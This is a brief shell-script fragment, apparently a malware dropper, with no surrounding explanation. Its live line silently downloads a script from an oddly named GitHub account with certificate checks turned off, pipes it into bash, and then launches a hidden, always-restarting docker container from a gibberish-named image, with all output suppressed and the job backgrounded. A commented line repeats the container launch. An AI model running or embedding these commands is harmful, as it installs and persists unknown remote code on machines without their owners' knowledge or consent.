...
# bash -c "docker run -dt --restart=always qocshbdak/qweugv:latest" >/dev/null 2>&1 &
bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main/d.sh |bash -s 9 servehulls/asodjvb && docker run -dt --restart=always qocshbdak/qweugv:latest" >/dev/null 2>&1 &
